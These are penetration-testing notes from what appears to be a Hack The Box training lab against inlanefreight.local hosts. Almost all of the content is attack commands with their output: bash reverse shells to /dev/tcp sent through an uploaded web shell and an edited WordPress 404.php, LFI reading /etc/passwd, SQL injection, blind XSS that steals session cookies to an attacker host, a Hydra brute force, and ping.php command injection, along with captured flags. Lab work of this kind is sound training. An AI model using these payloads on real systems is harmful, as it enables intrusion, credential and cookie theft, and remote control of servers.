# Web - Extracted Evidence

Compiled from ACME-IPT engagement notes (Attacking Enterprise Networks vault).

---

### #### **External Information Gathering**
_Source: External-Attack1, line ~177_

```
─(kali㉿kali)-[~/HTB/CPTS/Attacking_Enterprise_Networks]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://10.129.32.24/ -H 'Host:FUZZ.inlanefreight.local'  -fs 15157

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.32.24/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.inlanefreight.local
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 15157
________________________________________________

blog                    [Status: 200, Size: 8708, Words: 1509, Lines: 232, Duration: 305ms]
careers                 [Status: 200, Size: 51806, Words: 22041, Lines: 732, Duration: 325ms]
dev                     [Status: 200, Size: 2048, Words: 643, Lines: 74, Duration: 298ms]
gitlab                  [Status: 302, Size: 113, Words: 5, Lines: 1, Duration: 433ms]
ir                      [Status: 200, Size: 28548, Words: 2885, Lines: 210, Duration: 1568ms]
:: Progress: [84267/151265] :: Job [1/1] :: 137 req/sec :: Duration: [0:10:22] :: Errors: 0 ::
[INFO] ------ PAUSING ------

entering interactive mode
type "help" for a list of commands, or ENTER to resume.
> 
[INFO] ------ RESUMING -----

monitoring              [Status: 200, Size: 56, Words: 3, Lines: 4, Duration: 345ms]
```

---

### #### **Session Cookie Extraction**
_Source: External-Attack1, line ~392_

```
GET /profile?id=9 HTTP/1.1
Host: careers.inlanefreight.local
Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.aif58A.MA7cXAxfAcQUTJN_Kkk-IfsVv_A
```

---

### #### **dev.inlanefreight.local**
_Source: External-Attack1, line ~424_

```
$ gobuster dir -u http://dev.inlanefreight.local -w /usr/share/wordlists/dirb/common.txt -x .php -t 300

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.inlanefreight.local
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/06/20 22:04:48 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 288]
/.htpasswd            (Status: 403) [Size: 288]
/.hta                 (Status: 403) [Size: 288]
/.htpasswd.php        (Status: 403) [Size: 288]
/.hta.php             (Status: 403) [Size: 288]
/css                  (Status: 301) [Size: 332] [--> http://dev.inlanefreight.local/css/]
/images               (Status: 301) [Size: 335] [--> http://dev.inlanefreight.local/images/]
/index.php            (Status: 200) [Size: 2048]                                            
/index.php            (Status: 200) [Size: 2048]                                            
/js                   (Status: 301) [Size: 331] [--> http://dev.inlanefreight.local/js/]    
/server-status        (Status: 403) [Size: 288]                                             
/uploads              (Status: 301) [Size: 336] [--> http://dev.inlanefreight.local/uploads/]
/upload.php           (Status: 200) [Size: 14]                                               
/.htaccess.php        (Status: 403) [Size: 288]                                              
                                                                                             
===============================================================
2022/06/20 22:05:02 Finished
===============================================================
```

---

### #### **dev.inlanefreight.local**
_Source: External-Attack1, line ~488_

```
$ curl http://dev.inlanefreight.local/uploads/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

### #### **dev.inlanefreight.local**
_Source: External-Attack1, line ~494_

```
 ─$ curl "http://dev.inlanefreight.local/uploads/shell.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.14.220/9999%200>%261'"

```

---

### #### **ir.inlanefreight.local**
_Source: External-Attack1, line ~661_

```
┌──(kali㉿kali)-[~/HTB/CPTS/Attacking_Enterprise_Networks]
└─$ curl http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

```

---

### #### **ir.inlanefreight.local**
_Source: External-Attack1, line ~965_

```
 curl http://ir.inlanefreight.local/wp-content/themes/twentytwenty/404.php?0=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.14.120/4444%200>%261' 

nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.120] from (UNKNOWN) [10.129.40.237] 56874
Linux 7635d7d77b7b 5.4.0-113-generic #127-Ubuntu SMP Wed May 18 14:30:56 UTC 2022 x86_64 GNU/Linux
 14:44:36 up  1:08,  0 users,  load average: 0.47, 0.48, 0.36
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cd var
$ cd www
$ cd html
$ cat flag.txt
HTB{e7134abea7438e937b87608eab0d979c}

```

---

### #### **status.inlanefreight.local**
_Source: External-Attack2, line ~4_

```
' union select null, database(), user(), @@version -- //

```

---

### #### **status.inlanefreight.local**
_Source: External-Attack2, line ~11_

```
POST / HTTP/1.1
Host: status.inlanefreight.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 87
Origin: http://status.inlanefreight.local
Connection: keep-alive
Referer: http://status.inlanefreight.local/
Cookie: PHPSESSID=90p7spu0huj1jp3si49d214f1p
Upgrade-Insecure-Requests: 1
Priority: u=0, i

searchitem=union+select+null%2C+database%28%29%2C+user%28%29%2C+%40%40version+--+%2F%2F
```

---

### #### **status.inlanefreight.local**
_Source: External-Attack2, line ~157_

```
 "><script src=http://10.10.14.120:4444/TESTING_THIS></script>

```

---

### #### **status.inlanefreight.local**
_Source: External-Attack2, line ~162_

```
$ nc -lvnp 4444

listening on [any] 4444 ...
connect to [10.10.14.120] from (UNKNOWN) [10.129.203.101] 56202
GET /TESTING_THIS%3C/script HTTP/1.1
Host: 10.10.14.15:4444
Connection: keep-alive
User-Agent: HTBXSS/1.0
Accept: */*
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

---

### #### **status.inlanefreight.local**
_Source: External-Attack2, line ~195_

```
new Image().src='http://10.10.14.15:9200/index.php?c='+document.cookie

```

---

### #### **status.inlanefreight.local**
_Source: External-Attack2, line ~205_

```
"><script src=http://10.10.14.120:4444/script.js></script>

```

---

### #### **status.inlanefreight.local**
_Source: External-Attack2, line ~211_

```
─(kali㉿kali)-[~/HTB/CPTS/Attacking_Enterprise_Networks]
└─$ sudo php -S 0.0.0.0:4444
[sudo] password for kali: 
[Sun Jun 14 08:26:05 2026] PHP 8.4.21 Development Server (http://0.0.0.0:4444) started
[Sun Jun 14 08:27:05 2026] 10.129.229.147:56100 Accepted
[Sun Jun 14 08:27:05 2026] 10.129.229.147:56100 [200]: GET /script.js
[Sun Jun 14 08:27:05 2026] 10.129.229.147:56100 Closing
[Sun Jun 14 08:27:06 2026] 10.129.229.147:56102 Accepted
[Sun Jun 14 08:27:06 2026] 10.129.229.147:56102 [200]: GET /index.php?c=session=fcfaf93ab169bc943b92109f0a845d99
[Sun Jun 14 08:27:06 2026] 10.129.229.147:56102 Closing
[Sun Jun 14 08:27:08 2026] 10.129.229.147:56120 Accepted
[Sun Jun 14 08:27:08 2026] 10.129.229.147:56120 [200]: GET /script.js
[Sun Jun 14 08:27:08 2026] 10.129.229.147:56120 Closing
[Sun Jun 14 08:27:08 2026] 10.129.229.147:56122 Accepted
[Sun Jun 14 08:27:08 2026] 10.129.229.147:56122 [200]: GET /index.php?c=session=fcfaf93ab169bc943b92109f0a845d99
[Sun Jun 14 08:27:08 2026] 10.129.229.147:56122 Closing

```

---

### #### **tracking.inlanefreight.local**
_Source: External-Attack2, line ~244_

```
        javascript
    <script>
    x=new XMLHttpRequest;
    x.onload=function(){  
    document.write(this.responseText)};
    x.open("GET","file:///etc/passwd");
    x.send();
    </script>
```

---

### #### **tracking.inlanefreight.local**
_Source: External-Attack2, line ~263_

```
        javascript
    <script>
    x=new XMLHttpRequest;
    x.onload=function(){  
    document.write(this.responseText)};
    x.open("GET","file:///flag.txt");
    x.send();
    </script>
```

---

### #### **monitoring.inlanefreight.local**
_Source: External-Attack2, line ~334_

```

                                                                                                           
┌──(kali㉿kali)-[~/HTB/CPTS/Attacking_Enterprise_Networks]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt monitoring.inlanefreight.local http-post-form "/login.php:username=admin&password=^PASS^:Invalid Credentials" 
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-15 09:45:57
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://monitoring.inlanefreight.local:80/login.php:username=admin&password=^PASS^:Invalid Credentials
[STATUS] 901.00 tries/min, 901 tries in 00:01h, 14343498 to do in 265:20h, 16 active
[STATUS] 987.67 tries/min, 2963 tries in 00:03h, 14341436 to do in 242:01h, 16 active
[80][http-post-form] host: monitoring.inlanefreight.local   login: admin   password: 12qwaszx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-15 09:49:40
                                                                                      
```

---

### #### **monitoring.inlanefreight.local**
_Source: External-Attack2, line ~361_

```
$ curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'd"

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.045 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.045/0.045/0.045/0.000 ms
uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
```

---

### #### **monitoring.inlanefreight.local**
_Source: External-Attack2, line ~374_

```
$ curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'fconfig"

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.048 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.048/0.048/0.048/0.000 ms

<SNIP>

ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.203.101  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:feb9:67a5  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:67a5  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:67:a5  txqueuelen 1000  (Ethernet)
        RX packets 10055  bytes 1041358 (1.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2316  bytes 4030180 (4.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.8.120  netmask 255.255.254.0  broadcast 172.16.255.255
        inet6 fe80::250:56ff:feb9:a62d  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:a6:2d  txqueuelen 1000  (Ethernet)
        RX packets 21515  bytes 1890242 (1.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 15  bytes 1146 (1.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

---

### #### **monitoring.inlanefreight.local**
_Source: External-Attack2, line ~453_

```
┌──(kali㉿kali)-[~/HTB/CPTS/Attacking_Enterprise_Networks]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.245] from (UNKNOWN) [10.129.229.147] 41114
id
uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
ls
00112233_flag.txt
css
img
index.php
js
login.php
ping.php


```
